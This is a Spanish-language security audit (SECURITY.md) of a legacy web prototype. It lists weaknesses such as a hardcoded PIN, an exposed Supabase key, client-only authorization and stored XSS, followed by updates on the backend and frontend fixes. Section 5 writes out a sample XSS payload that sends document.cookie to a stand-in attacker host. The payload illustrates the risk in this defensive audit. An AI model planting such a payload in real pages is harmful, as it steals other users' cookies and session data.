# SECURITY.md — Auditoría de seguridad estática de `index.html`

> Auditoría **estática y local**: se leyó el código completo de `index.html`. No se realizaron pruebas contra Supabase, Open-Meteo ni ningún otro servicio externo, ni se intentó explotar nada. Todos los hallazgos son sobre el código tal como está escrito, no sobre el comportamiento observado en producción.

## 1. PIN escritos o descargados en el frontend

- `var ADMIN_PIN = '1234';` (línea 3696) — **PIN de administrador hardcodeado en el código fuente** como valor por defecto ("se sobreescribe con el de Supabase al cargar", según el propio comentario). Si `loadPines()` falla (red caída, tabla vacía, error de permisos), la app queda con `'1234'` como PIN de admin válido, sin ningún aviso al usuario.
- `USER_PINS` se pobla igual, trayendo los PINes de **todas** las personas desde Supabase al cliente en cada carga de la app (`loadPines()`, línea 3701) — cualquiera con acceso al navegador (DevTools, extensión, proxy) puede leer `USER_PINS` en memoria y obtener el PIN de **todo el equipo**, no solo el propio.
- Los PIN se comparan en texto plano en el cliente (`checkPin()`, `checkUserPin()`) contra el valor descargado — no hay hashing ni verificación server-side.
- No hay límite de intentos ni bloqueo temporal tras PIN incorrecto — un PIN de 4 dígitos numéricos tiene solo 10.000 combinaciones, trivialmente forzable por fuerza bruta si alguien automatiza clicks o llama `checkPin()`/`pinKey()` directamente desde la consola.

## 2. Credenciales expuestas

- `SB_URL` y `SB_KEY` (API key anónima de Supabase, JWT) están hardcodeadas en texto plano en el HTML servido al navegador (línea 1701-1702), visibles para cualquiera que abra "Ver código fuente".
- La key es de tipo `anon`, que en el modelo de Supabase está diseñada para ser pública **si y solo si** hay Row Level Security (RLS) correctamente configurado en cada tabla. Esta auditoría **no puede confirmar** si existe RLS en el proyecto Supabase real (está fuera del alcance: no se accede al proyecto). Dado que toda la lógica de permisos observada vive en el JavaScript del cliente (variable `currentRole`), y no se ve ningún mecanismo de autenticación que la API de Supabase pueda usar para distinguir admin de empleado (no hay JWT de usuario individual, todos comparten la misma `anon key`), **es razonable asumir que, si hay RLS, es a lo sumo básico** (por ejemplo, deshabilitado o abierto a la key anónima) — cualquier persona con la key puede leer/escribir directamente cualquier tabla vía la REST API de Supabase, sin pasar por la UI ni por el chequeo de rol.
- Este es el hallazgo de mayor severidad del prototipo: **efectivamente, cualquiera que abra el HTML tiene acceso de lectura/escritura completo a toda la base de datos**, independientemente del rol que la UI le muestre.

## 3. Autorización basada solamente en interfaz

- Confirmado en todo el código: `isAdmin()` (línea 3889) es `currentRole === 'admin'`, una variable JavaScript en memoria del cliente.
- Todos los controles de "solo admin" (ocultar botones, condicionar ramas de render) son controles de **presentación**, no de autorización real — no hay ningún punto donde el servidor (Supabase) verifique el rol del solicitante antes de aceptar una escritura, porque no existe una noción de "usuario autenticado" del lado de Supabase distinta de la app key compartida.
- Consecuencia práctica: un empleado (rol `user`) puede, sin necesitar el PIN de admin, ejecutar en la consola del navegador exactamente las mismas llamadas `fetch` que usa el botón de admin, y lograr el mismo efecto (crear/editar/eliminar tareas, personas, eventos, etc.).

## 4. Acceso directo a Supabase

- Confirmado: **todas** las operaciones de datos de la app (lectura y escritura) son llamadas `fetch` directas desde el navegador a `https://<project-ref>.supabase.co/rest/v1/...` (el identificador real del proyecto se retiró de esta documentación y del repositorio — ver "Actualización — retiro del prototipo heredado" al final de esta sección), usando `sbFetch`/`sbGet`/`sbPost` y, en varios lugares, `fetch` crudo con los mismos headers armados a mano (p. ej. `deltaS`, `dbUpdateStock`, `guardarTipoMascota`, `eliminarTipo`, `eliminarDestino`, `eliminarCategoria`).
- Esto es exactamente el patrón que la arquitectura objetivo (`docs/ARCHITECTURE.md`) busca eliminar: **el frontend nunca debe hablar directo con la base de datos**. Es la razón principal, desde el punto de vista de seguridad, por la que se justifica introducir un backend propio.

## 5. Riesgos XSS

- Prácticamente toda la interfaz se construye concatenando datos en strings HTML asignados a `innerHTML`, sin ninguna función de escape (`escapeHtml`, `textContent`, sanitizador) en ningún lugar del archivo (se buscó explícitamente y no existe tal función).
- Campos de texto libre que un usuario (admin o empleado) puede escribir y que luego se insertan sin escapar en `innerHTML` de otras vistas, verificados en el código:
  - Descripción de tarea (`t.d`) — `rndTareas()`, `rndHistorial()`, `calDia()`.
  - Texto de novedad (`nv.txt`) — `rndNov()`, `rndInicio()`.
  - Título y nota de evento (`ev.titulo`, `ev.nota`) — `rndEv()`, `rndInicio()`.
  - Nombre de ítem de stock (`i.n`) — `sItemH()`, `rndCompras()`.
  - Motivo de consumo (`con.motivo`) — `rndConsumos()`, `rndReportes()`.
  - Nombre y descripción de mascota/registro clínico (`m.nombre`, `r.desc`) — `rndMascotas()`, `rndRegistros()`.
  - Título de foto (`f.titulo`) — `rndFotos()`, `verFoto()`.
  - Nombre de persona (`p.n`) — usado en decenas de lugares.
- **Escenario concreto de explotación**: cualquier persona con sesión (admin o empleado) puede escribir, por ejemplo, en el campo "Descripción" de una tarea nueva, un valor como `<img src=x onerror="fetch('https://atacante.example/robo?c='+document.cookie)">`. Ese valor queda guardado en Supabase (sin sanitizar en el servidor tampoco, porque no hay servidor) y se ejecuta como HTML/JS real en el navegador de **cualquier otra persona** (incluido un admin) que abra la pantalla de Tareas — es un **XSS almacenado** clásico, disponible en múltiples módulos, no uno solo.
- Dado que la sesión vive en `sessionStorage` (no en cookie httpOnly), un XSS exitoso también puede leer `lc_role`/`lc_uid` y, más grave aún, puede simplemente usar `SB_KEY`/`SB_URL` (visibles en el mismo contexto de página) para actuar directamente contra la base de datos con el mismo nivel de acceso que la app entera.

## 6. Datos personales

- La tabla/entidad `empleados_datos` almacena datos personales sensibles de cada empleado: fecha de nacimiento, teléfono, **CUIL** (identificador fiscal/previsional argentino), estado civil, obra social, contacto de emergencia (nombre y teléfono).
- `hijos` almacena nombre y fecha de nacimiento de menores de edad (hijos de empleados).
- Ninguno de estos datos tiene cifrado a nivel de aplicación, ni control de acceso más allá del rol de interfaz ya descartado como control real (secciones 2 y 3). Cualquiera con la `SB_KEY` (visible en el HTML) puede leer estos datos directamente vía la API REST de Supabase.
- Esto es un hallazgo relevante para cualquier obligación de protección de datos personales aplicable (p. ej. Ley 25.326 en Argentina) — se señala como riesgo, sin asumir cuál es el marco legal exacto aplicable al proyecto (fuera del alcance de esta auditoría técnica).

## 7. Fotografías

- Se suben como `data:` URL base64 directamente al campo `src` de la tabla `fotos`, sin validación de tipo MIME real más allá del atributo `accept="image/*"` del `<input>` (que es solo una sugerencia de UI, no una validación de seguridad — un archivo con otra extensión/contenido podría subirse igual si se manipula el input).
- Sin límite de tamaño de archivo validado en el cliente ni, presumiblemente, en Supabase (no verificable desde el HTML).
- Cualquier persona logueada (no solo admin) puede eliminar cualquier foto (`verFoto()`, botón sin gate de `isAdmin()` — ver `docs/BUSINESS_RULES.md` §1 y §18).
- Las fotos pueden incluir menores de edad (hijos de empleados) o personas identificables sin que el código tenga ningún control de consentimiento/privacidad — dato a tener en cuenta para la etapa del módulo de fotografías (permisos de acceso, quién puede verlas).
- **Actualización — decisión de Object Storage (previa a conectar Neon)**: Google Drive fue descartado como destino de almacenamiento; se reemplaza por Neon Object Storage (interfaz S3), con bucket privado por entorno (`demo`/`production`) y credenciales exclusivas del backend — nunca en el frontend. El modelo (`FileAsset`) no persiste URL pública, URL firmada temporal, ni credenciales; ver `docs/ARCHITECTURE.md`, sección 9, para el detalle completo de buckets, ambientes y los flujos de escritura/lectura futuros. La eliminación de fotografías sigue siendo exclusiva de `ADMIN` (corrigiendo la inconsistencia del prototipo señalada en la sección 1 de este documento).

## 8. Manejo de sesiones

- `sessionStorage.setItem('lc_role', ...)` / `sessionStorage.setItem('lc_uid', ...)` (línea 3836-3837) — persiste el rol y el ID de persona en almacenamiento del navegador, legible por cualquier script que corra en el mismo origen (incluido un XSS, ver sección 5).
- No hay expiración de sesión más allá del cierre de la pestaña/navegador (comportamiento nativo de `sessionStorage`).
- No hay invalidación de sesión del lado del servidor (no existe "servidor" en el sentido de sesión — Supabase no sabe nada de `currentRole`).
- `logout()` solo limpia el `sessionStorage` local; no revoca ni invalida nada a nivel de Supabase (tampoco tendría sentido revocar, porque la key es compartida por toda la app, no por sesión de usuario).

## 9. CORS

- No hay configuración de CORS propia de la aplicación, porque no hay servidor propio — el navegador llama directo a Supabase (que maneja su propio CORS) y a Open-Meteo (público, sin autenticación). No aplica análisis de CORS de "nuestro backend" porque, en el prototipo actual, no existe.

## 10. Validaciones

- Las únicas validaciones observadas son del lado del cliente y superficiales:
  - Campos de texto requeridos: chequeo de `.trim()` no vacío antes de guardar (tareas, ítems, personas, eventos, hijos).
  - PIN de admin/persona: regex `/^\d{4}$/` al cambiarlo (`changePin`, `changeUserPin`).
  - Cantidades numéricas: `parseFloat`/`parseInt` con fallback a `0`, sin rango máximo.
- No hay validación de formato para CUIL, teléfono, ni ningún campo de `empleados_datos`.
- No hay validación de tipo de archivo real en la subida de fotos (ver sección 7).
- Ninguna de estas validaciones existe también del lado del servidor, porque no hay servidor — todas son evitables llamando la API de Supabase directamente con la key expuesta.

## 11. Operaciones concurrentes de inventario

- Confirmado en el código (`gItem()`, `deltaS()`, `gAjuste()`, `guardarConsumo()`): el patrón general es leer el `stock` actual desde el estado en memoria del cliente, calcular el nuevo valor, y hacer un `PATCH` con el valor absoluto final — **sin verificación de que el valor no haya cambiado entre la lectura y la escritura** (sin columna de versión, sin `updated_at` comparado, sin transacción).
- Riesgo concreto: si dos personas registran un consumo del mismo ítem casi simultáneamente desde dos dispositivos distintos, la segunda escritura puede pisar el resultado de la primera (perder el descuento de stock de una de las dos operaciones), aunque ambos registros de `consumos` queden guardados (el historial de movimientos sería correcto, pero el `stock.stock` final quedaría desincronizado respecto a la suma real de movimientos).

## 12. Riesgos de eliminación y modificación

- Casi todas las eliminaciones usan `confirm()` del navegador como única barrera (tareas, eventos, fotos, personas dan de baja, registros clínicos, categorías, destinos, tipos de mascota) — es una confirmación de UI, no un control de seguridad; no impide un borrado hecho directo contra la API.
- Eliminaciones físicas (no reversibles desde la app) confirmadas: tareas (+ sus ejecuciones), eventos, fotos, registros clínicos, hijos, tipos de mascota, categorías de stock, y destinos de consumo en su variante "eliminar definitivamente".
- Bajas lógicas (reversibles) confirmadas: personas (`activa`), destinos de consumo en su variante "solo inactivar", categorías de stock también ofrecen expresamente conservar el vínculo con ítems existentes aunque se borre la categoría del catálogo (dato ya señalado como riesgo de integridad en `docs/DATABASE.md`).
- No se detectó ningún mecanismo de "papelera" o recuperación tras borrado físico — un borrado accidental de una tarea, evento o foto es irreversible desde la propia app.

## Resumen de severidad (evaluación cualitativa, sujeta a confirmación humana)

| Hallazgo | Severidad estimada |
|---|---|
| Acceso completo a la base de datos vía key expuesta en el cliente, sin autenticación real de usuario | Crítica |
| XSS almacenado en múltiples módulos vía `innerHTML` sin sanitizar | Crítica |
| Autorización de rol enteramente client-side, evitable desde DevTools | Alta |
| PIN de 4 dígitos sin límite de intentos, compartido/descargado al cliente completo | Alta |
| Datos personales sensibles (CUIL, contacto de emergencia, datos de menores) sin control de acceso real | Alta |
| Eliminación de fotos sin restricción de rol | Media |
| Sin control de concurrencia en actualizaciones de stock | Media |
| Fotos como base64 sin validación de tipo/tamaño | Media |
| Sesión en `sessionStorage`, sin expiración server-side | Media |

Estos hallazgos son, en conjunto, la justificación técnica central de por qué la reconstrucción (`docs/MIGRATION_PLAN.md`) introduce un backend propio con autenticación y autorización reales, y por qué el frontend nunca debe volver a tener credenciales de base de datos.

## Actualización — retiro del prototipo heredado (Etapa 2.3)

El hallazgo más severo de esta auditoría (acceso completo a la base vía `SB_URL`/`SB_KEY` hardcodeados) dejó de ser un riesgo *potencial* del repositorio: `index.html` y `legacy/index.original.html` — los dos únicos archivos que contenían ese identificador de proyecto y esa API key reales — fueron **retirados por completo del repositorio, del árbol de trabajo y de todo el historial de Git local** (no solo eliminados en un commit nuevo). Se verificó, antes de retirarlos, que todo su contenido funcional y de datos ya estaba migrado a `docs/`, a `backend/prisma/schema.prisma` y al seed. Cualquier mención al identificador real del proyecto Supabase que quedaba en esta documentación (y en un test de guarda del seed) también se redactó de la misma forma. Ver `docs/MIGRATION_PLAN.md`, "Etapa 2.3", para el detalle completo de la verificación y el procedimiento de purga.

Esto no reemplaza una acción pendiente del lado de Supabase: si ese proyecto sigue activo en producción, **rotar/revocar la `anon key` real sigue siendo responsabilidad del usuario**, fuera del alcance de este repositorio — retirar el archivo del repo elimina la exposición *aquí*, no invalida la key en Supabase.

## Actualización — Neon: separación pooled/direct y un incidente detectado y corregido (Etapa 3A)

- **`DATABASE_URL` (pooled) y `DIRECT_URL` (directa)** son dos credenciales distintas de la misma rama `demo`, con propósitos que nunca se intercambian: la app y el seed usan la pooled; Prisma Migrate usa la directa (ver `docs/ARCHITECTURE.md`, sección 13.1). Ninguna de las dos se commitea nunca — viven solo en el `.env` local, gitignored.
- **`production` nunca comparte archivo con `demo`.** Sus credenciales, cuando se configuren, van directamente en el dashboard de Render — nunca en un `.env` de este repositorio, nunca en Netlify.
- **Incidente detectado durante la verificación previa a esta etapa**: una connection string real de Neon (usuario y contraseña en texto plano) se pegó por error en `.env.example` (archivo versionado), en vez de en el `.env` local. Se detectó por observación directa antes de cualquier `git add`/commit — confirmado con `git diff`/`git log`/`git show origin/main` que **nunca llegó a un commit ni a GitHub**. Se restauró `.env.example` al placeholder vacío de inmediato y se agregó un test de regresión (`backend/src/test/env-example.test.ts`, describe "Neon (Etapa 3A)") que falla si una connection string real (o un host `*.neon.tech`) vuelve a aparecer ahí. Se documenta acá por la misma razón que se documentó el hallazgo de Google Drive/Supabase: la transparencia sobre un secreto que estuvo cerca de exponerse es parte de la auditoría de seguridad de este proyecto, no algo para omitir porque "no pasó a mayores".
- El script de comprobación de conexión (`npm run db:check`) y los scripts de migración/seed nunca imprimen la connection string ni datos de fila — solo resultados agregados o de éxito/fallo (ver `docs/ARCHITECTURE.md`, sección 13.3).

## Actualización — `DATABASE_TARGET`: barrera ejecutable contra `production` (revisión correctiva del PR #1)

Documentar la intención ("estos scripts nunca tocan `production`") no era suficiente — ningún código la hacía valer. Se agregó `DATABASE_TARGET` (`demo` | `production`, backend-only, nunca `VITE_`) y una guarda de código (`backend/src/scripts/guardDbCommand.ts`, ver `docs/ARCHITECTURE.md` sección 13.7) que corre antes de invocar Prisma o abrir cualquier conexión en los 4 comandos locales con capacidad de escritura (`db:migrate:dev`, `db:migrate:deploy`, `db:seed`, `test:integration`): si `DATABASE_TARGET` no es exactamente `"demo"`, o falta la variable de conexión requerida, o su forma no coincide con lo esperado (pooled/direct), el comando falla ahí mismo — sin conectarse a nada, sin revelar ningún valor. Esto no reemplaza la disciplina de mantener las credenciales de `production` fuera de cualquier `.env` local (sigue siendo la protección de fondo); es una segunda barrera contra el error accidental, no contra una evasión deliberada del propio código.

## Actualización — autenticación real implementada (Etapa 3B.1)

Esta etapa resuelve del lado del backend, con código verificado (no solo documentado), varios de los hallazgos críticos/altos de la auditoría original:

- **"Acceso completo a la base vía key expuesta" / "autorización enteramente client-side"** (secciones 2 y 3): ya no aplica al código nuevo — el frontend no tiene ninguna credencial de base de datos, y toda autorización se resuelve en el servidor (`requireAuth`/`requireRole`, ver `docs/ARCHITECTURE.md` sección 14.5) contra el estado real en base, nunca contra un claim del cliente ni contra un rol en memoria del navegador.
- **"PIN de 4 dígitos sin límite de intentos, compartido/descargado al cliente completo"** (sección 1): reemplazado por contraseña individual por usuario (Argon2id, política de longitud mínima 12, sin PIN compartido de admin) más un rate limit específico y más estricto para `/auth/login`/`/auth/refresh` que el general de `/api`. **Actualización Etapa 3B.2**: se volvió a un PIN de 4 dígitos por decisión funcional (no por regresión de seguridad) — ver la actualización específica más abajo, "Autenticación por PIN (Etapa 3B.2)", para por qué esto no reintroduce el hallazgo original.
- **"Sesión en `sessionStorage`, sin expiración server-side"** (sección 8): reemplazado por un modelo de sesión real y revocable (`Session`, con `revokedAt`) — el access token nunca se guarda en `localStorage`/`sessionStorage` (viaja en memoria del cliente, fuera del alcance de esta etapa por no haber pantalla de login todavía) y el refresh token viaja únicamente en una cookie `HttpOnly`, no accesible desde JavaScript ni siquiera ante un XSS.
- El hallazgo de **XSS almacenado** (sección 5) sigue sin resolverse — corresponde a cuando se reconstruyan las pantallas del frontend (sanitización de HTML al renderizar contenido de usuario) y está fuera del alcance de esta etapa, que no toca el frontend.

Detalle técnico completo (algoritmos, parámetros, rotación de refresh token, cookies/CSRF, endpoints, bootstrap del primer admin) en `docs/ARCHITECTURE.md`, sección 14.

## Actualización — autenticación por PIN (Etapa 3B.2)

El hallazgo original de mayor severidad de esta auditoría no era "el prototipo usa PIN" — era que **cualquiera podía leer el PIN de todo el equipo desde el cliente** (`USER_PINS` descargado completo al navegador), que **no había límite de intentos** (10.000 combinaciones, trivialmente forzable), y que **el PIN se comparaba en texto plano en el cliente**, sin ningún servidor real de por medio (secciones 1 y 2). Volver a un PIN de 4 dígitos como credencial visible, entonces, es una decisión de producto legítima **siempre que se resuelvan esos tres problemas específicos** — y se resuelven así:

- **Nunca se descarga ningún PIN ni hash al cliente.** `GET /auth/login-options` (el equivalente al selector "Administrador / equipo de trabajo" del prototipo) devuelve únicamente `id`, `displayName`, `role` y `colorHex` — jamás `pinHash` ni ningún campo de credencial. El PIN se valida exclusivamente en el backend, contra un hash Argon2id, nunca comparando texto plano.
- **Límite de intentos real y persistente**, ausente en el prototipo: 5 intentos fallidos consecutivos bloquean la cuenta 15 minutos, con el contador y el bloqueo guardados en Postgres (no en memoria del proceso, para que sobrevivan a un reinicio de Render) — además del rate limit por IP que ya existía para `/auth/login`. Ver `docs/ARCHITECTURE.md`, sección 14.1a.
- **PIN individual, nunca compartido ni predeterminado.** Cada persona (incluido el admin) tiene su propio PIN, asignado por un administrador al activar la cuenta — nunca un valor fijo tipo `'1234'`, nunca un PIN de admin compartido entre varias personas (a diferencia de `ADMIN_PIN` en el prototipo). Un empleado no puede cambiar su propio PIN (evita que alguien lo cambie y bloquee al resto del equipo, o que se pierda trazabilidad de quién lo definió); solo un `ADMIN` puede asignarlo o cambiarlo, y ese cambio queda auditado.
- **Sigue sin haber ningún "modo admin sin persona asociada" que pierda trazabilidad** (a diferencia del hallazgo de `docs/BUSINESS_RULES.md` sección 1 sobre el prototipo): el admin creado por `bootstrap-admin` es una cuenta individual como cualquier otra, con su propio `User.id`, su propio audit trail (`actorUserId`), simplemente sin un `Employee` vinculado.

Todo lo que la Etapa 3B.1 ya había corregido y que no depende del formato de la credencial —JWT de corta duración, refresh token opaco con rotación y detección de reuso, cookies `HttpOnly`, sesiones revocables, autorización por rol validada en el servidor, `session.userId === token.sub`— se mantiene exactamente igual; el PIN solo reemplaza al paso "¿cómo se demuestra que sos vos?", no a nada del resto de la cadena de autenticación/autorización.

Detalle técnico completo en `docs/ARCHITECTURE.md`, secciones 14.1, 14.1a, 14.6a y 14.13.

## Actualización — frontend de autenticación por PIN (Etapa 3C)

Primer código de frontend que maneja credenciales de verdad. Decisiones de seguridad, verificadas con tests (no solo documentadas):

- **El access token existe únicamente en memoria del proceso de JS** (`frontend/src/auth/accessTokenStore.ts`, una variable de módulo) — nunca `localStorage`, nunca `sessionStorage`, nunca `IndexedDB`, nunca una cookie legible desde JavaScript. Verificado con un test que espía `Storage.prototype.setItem` durante todo el ciclo de login/logout, y con un escaneo del bundle de producción compilado (`frontend/dist`) sin coincidencias de `localStorage`/`sessionStorage`.
- **El refresh token nunca es accesible desde el frontend** — sigue viajando exclusivamente en la cookie `HttpOnly` que ya existía (`lc_refresh_token`), sin ningún cambio de ese lado. El frontend ni siquiera intenta leerla.
- **El PIN nunca se persiste más allá del intento en curso** (ver `docs/ARCHITECTURE.md` §15.6): vive solo como estado de React local a la pantalla de PIN, se limpia ante error/navegación/desmontaje, nunca se registra en logs, nunca viaja en una URL, nunca queda en un mensaje de error mostrado al usuario. Escaneado explícitamente en el diff y en el bundle compilado: sin PIN hardcodeado (`1234` u otro), sin el valor de ningún PIN sintético de test filtrado al código de producción.
- **`colorHex` (el único dato del backend que se inyecta en un atributo `style`) se valida contra un patrón hex estricto antes de usarse** — un valor inesperado (`null`, o algo que no sea un color hex válido) cae a un color neutro fijo, nunca se interpola sin validar. Ningún dato del backend se renderiza con `dangerouslySetInnerHTML` en ningún punto de este flujo (búsqueda explícita en `frontend/src`: cero coincidencias, solo aparece en el código interno de React mismo, empaquetado).
- **Nunca se debilitó ninguna protección existente del backend para que el frontend "funcionara más fácil"**: CORS sigue restringido a `FRONTEND_URL` con credenciales, `validateOrigin` sigue exigiendo el header `Origin` en `/refresh`/`/logout`, las cookies siguen `HttpOnly`/`SameSite` sin relajar. El proxy de Vite en desarrollo (`docs/ARCHITECTURE.md` §15.7) hace que estas verificaciones sean transparentes (mismo origen desde la perspectiva del navegador), no las evita.
- **Protección de concurrencia espejada del lado del cliente**: React StrictMode ejecuta efectos dos veces en desarrollo — sin un coordinador single-flight de `POST /auth/refresh` (`frontend/src/auth/refreshCoordinator.ts`), eso dispararía dos refresh reales con el mismo token y activaría la detección de rotación concurrente del backend (§14.12), pudiendo revocar la sesión que se acababa de restaurar. Mismo mecanismo protege contra varios 401 simultáneos disparando refresh por separado. Un logout mientras un refresh sigue en vuelo descarta explícitamente el resultado tardío (no vuelve a autenticar a quien ya cerró sesión) — las tres garantías tienen test dedicado.
- **Ningún dato mock en tiempo de ejecución**: la lista de identidades viene exclusivamente de `GET /auth/login-options` real; una respuesta vacía (el estado real actual — 0 usuarios activos) se muestra como tal, nunca se completa con personas/PIN inventados. Verificado con un test dedicado y con una inspección manual del bundle compilado.

Detalle técnico completo en `docs/ARCHITECTURE.md`, sección 15.

## Actualización — administración de usuarios en el frontend (Etapa 3D)

Primer módulo de frontend que ejecuta mutaciones administrativas reales (activar, cambiar PIN, cambiar estado). Decisiones de seguridad, verificadas con tests (no solo documentadas):

- **`/admin/users` exige simultáneamente sesión y rol `ADMIN`** (`ProtectedRoute` + `RequireRole`, primer consumidor real de `RequireRole` desde que se preparó en la Etapa 3C) — un `EMPLOYEE` autenticado recibe una pantalla de acceso denegado, nunca el contenido administrativo, y un anónimo va al login. El backend vuelve a exigir exactamente lo mismo de forma completamente independiente en cada request (`requireAuth` + `requireRole('ADMIN')`) — el frontend nunca es la única barrera; ocultar un botón o una ruta en el cliente nunca reemplaza la autorización real del servidor.
- **El PIN nunca se descarga al cliente en ningún endpoint de esta pantalla** — `GET /admin/users` no selecciona `pinHash` (verificado contra el `select` real del controlador, no asumido), y las tres mutaciones (`activate`/`reset-pin`/`status`) solo devuelven `{ ok: true }`. Un administrador puede asignar/cambiar el PIN de cualquier persona, pero nunca puede leer, recuperar ni ver el PIN actual de nadie (ni siquiera el propio) — no existe ningún endpoint ni ningún campo para eso.
- **El PIN nuevo se envía siempre en el body JSON, nunca en la URL/query string** — no queda en logs de acceso ni en el historial del navegador. Escaneado explícitamente: sin PIN hardcodeado, sin `1234` ni patrones equivalentes, sin `localStorage`/`sessionStorage`, sin `pinHash` en el bundle de producción compilado (`frontend/dist`).
- **Cambiar el PIN de otra persona revoca todas sus sesiones activas** (ya implementado en el backend desde la Etapa 3B.2) — la pantalla lo muestra como advertencia explícita antes de confirmar, nunca como una sorpresa después. Un empleado sigue sin poder cambiar su propio PIN (no existe, ni existió nunca, ningún endpoint de autoservicio) — la única persona que puede cambiar el PIN de alguien es un `ADMIN`.
- **Cambiar el propio PIN, o el propio estado a uno que revoca sesiones, termina en un logout local real** — se reutiliza el mecanismo de la Etapa 3C (`AuthProvider.logout()` + la "época" de `accessTokenStore` que descarta un refresh tardío), nunca se intenta seguir usando ni renovar una sesión que el propio backend ya revocó.
- **Auto-bloqueo del sistema**: un `ADMIN` no puede dejar al sistema sin ningún administrador activo — protegido en el backend desde la Etapa 3B.1 (`SelfLockoutError`); esta etapa además evita *ofrecer* ese botón del lado del cliente cuando ya se puede saber que fallaría (mejora de UX, no un control de seguridad nuevo: el backend sigue siendo quien efectivamente lo impide).
- **Corrección de un defecto real de backend, encontrado por revisión de contrato antes de construir la UI** (no por un fallo observado en producción): reactivar (`-> ACTIVE`) a un usuario que nunca tuvo PIN asignado devolvía un 500 crudo (violación de un `CHECK` de la base) en vez de un rechazo controlado — corregido antes de exponer el botón correspondiente en la interfaz. Ver `docs/ARCHITECTURE.md` §14.6b.
- **Ningún dato mock ni fixture en tiempo de ejecución**: el listado viene exclusivamente de `GET /admin/users` real; los 4 empleados reales siguen `PENDING_ACTIVATION` y no se activaron ni se les asignó PIN como parte de esta etapa.

Detalle técnico completo en `docs/ARCHITECTURE.md`, sección 16.

## Actualización — módulo Tareas (Etapa 4A)

- **Ningún endpoint de tareas es público** (`requireAuth` en todo el router, test dedicado por ruta). Los permisos por rol se deciden en el backend con el rol y el empleado leídos de la base; el frontend solo oculta lo que igual se rechazaría.
- **El ejecutor no se puede falsificar**: para un `EMPLOYEE`, `completedByEmployeeId` sale siempre de sesión → `User` → `employeeId`; un `employeeId` ajeno en el body → 403, cualquier campo no previsto (`completedByEmployeeId`, `periodKey`) → 400 (Zod `.strict()`). Solo un `ADMIN` indica el ejecutor, y el backend verifica que exista y esté activo.
- **Integridad bajo concurrencia**: el índice único parcial es la defensa final; la segunda finalización simultánea responde 409 controlado y revierte su transacción completa (probado con 8 requests reales simultáneas contra `demo`).
- **Trazabilidad sin borrado**: sin borrado físico de tareas ni de ejecuciones; las reversiones quedan marcadas en la fila y auditadas (`task.created/updated/activated/deactivated/completed/completion_reverted`), diferenciando actor (`actorUserId`), responsable asignado y ejecutor. Las auditorías guardan IDs y campos cambiados, nunca tokens, PIN, headers, cookies ni objetos Prisma completos.
- **Entrada**: descripciones y motivos normalizados, sin HTML ni caracteres de control, con longitud máxima; React los renderiza como texto (sin `dangerouslySetInnerHTML`, verificado por test estático). Errores siempre `{ message, code }`, nunca Prisma crudo (verificado en integración).
- **Zona horaria**: `BUSINESS_TIME_ZONE` es backend-only (sin prefijo `VITE_`), sin datos sensibles.

## Actualización — Desempeño (Etapa 4B)

Endpoints autenticados y rango Zod de hasta 90 días. El backend fuerza sesión → User → Employee: un EMPLOYEE no consulta otro ID ni recibe nombres/métricas ajenas. Sin SQL dinámico, objetos Prisma crudos, secretos ni storage del cliente.

## Actualización — backend de Stock (Etapa 5A)

- Todo el router exige autenticación y el servicio vuelve a decidir permisos por rol. Los bodies `.strict()` impiden suplantar empleado/usuario o asignar directamente saldo, área y estado.
- Saldo, movimiento y auditoría comparten una transacción. Las reducciones tienen condición atómica de saldo suficiente y los incrementos usan `increment`; no existe el patrón vulnerable de leer-calcular-escribir un valor absoluto.
- Cantidades operativas son strings decimales positivos de hasta dos decimales; cero, negativos, exponentes, `NaN`, `Infinity` y ceros iniciales ambiguos se rechazan antes de Prisma. El límite de saldo coincide con `Decimal(10,2)`.
- No hay endpoints de edición/borrado de movimientos ni borrado físico de catálogo. La auditoría guarda IDs y valores de negocio normalizados, no credenciales, cookies, tokens ni objetos Prisma completos.
- La integración real solo está habilitada con `DATABASE_TARGET=demo`, crea fixtures sintéticas identificables, las elimina y verifica que los conteos globales vuelvan a la línea de base. No usa `production`, `db push`, reset ni seed.

## Actualización — Stock: destinos, nivel e idempotencia (Etapa 5C.1)

- **Destinos**: `POST`/`PATCH` son de `ADMIN` (decisión en el servicio, como todo el módulo) y **no existe `DELETE` en ninguna ruta de stock** — la baja es inactivación, sin destrucción de historial; la FK de los movimientos es `ON DELETE RESTRICT`. Los schemas `.strict()` impiden enviar `type` en un PATCH (inmutable) o campos desconocidos. El nombre es único global (`@unique`); la colisión se traduce a un `409 STOCK_DESTINATION_DUPLICATE` controlado, nunca a un error crudo de base. Auditorías separadas por acción, sin datos sensibles.
- **Filtro `stockLevel`**: el único SQL crudo nuevo del proyecto es estático y **parametrizado** — la única entrada es el nivel, elegida por las ramas de un `CASE`; no hay concatenación de valores del usuario ni consultas armadas en tiempo de ejecución. Devuelve solo UUIDs de `stock_items`; el resto de filtros/orden/paginación sigue por Prisma con los mismos `where` tipados de siempre. Sin carga de inventario completo en memoria del proceso.
- **`Idempotency-Key` (opcional en 5C.1)**: formato estricto `^[A-Za-z0-9_-]{8,64}$` validado antes de cualquier escritura (`400 IDEMPOTENCY_KEY_INVALID`) — sin caracteres que puedan confundirse con sintaxis de logging o SQL. La clave se guarda junto al endpoint lógico y el actor, de modo que claves de usuarios o endpoints distintos nunca colisionan entre sí. El `requestHash` es SHA-256 sobre una serialización canónica fija del request ya validado, incluida la fecha efectiva resuelta en la zona de negocio: **no incluye secretos, tokens, PIN ni valores aleatorios**, y la respuesta almacenada para el replay contiene únicamente los DTO del movimiento y del producto (nunca la huella ni el registro crudo — verificado por test). Un replay no re-ejecuta lógica de negocio ni toca saldo/auditoría; un cuerpo distinto bajo la misma clave es `409` y no se procesa; un registro incompleto o temporalmente no visible tras la colisión es `409` controlado y **nunca** se reintenta a ciegas. Solo el `P2002` del unique idempotente (identificado por nombre de índice, la forma real de `@prisma/adapter-pg`) activa esta rama; otros unique conservan su error propio y un `P2002` sin identidad se propaga en lugar de asumirse replay o duplicado. Los UUID se canonicalizan en minúsculas antes de formar el endpoint lógico y la huella. Sin caché en memoria (la unicidad la garantiza el índice de Postgres), sin reutilizar `StockMovement.reference`.
- **Registro de idempotencia y retención**: la tabla nueva no almacena nada sensible más allá de la huella y la respuesta (que ya era visible para el cliente). **Sin purga en esta etapa** — deuda documentada; el índice sobre `created_at` queda listo para el futuro proceso de retención (`docs/DATABASE.md`, "Etapa 5C.1A").
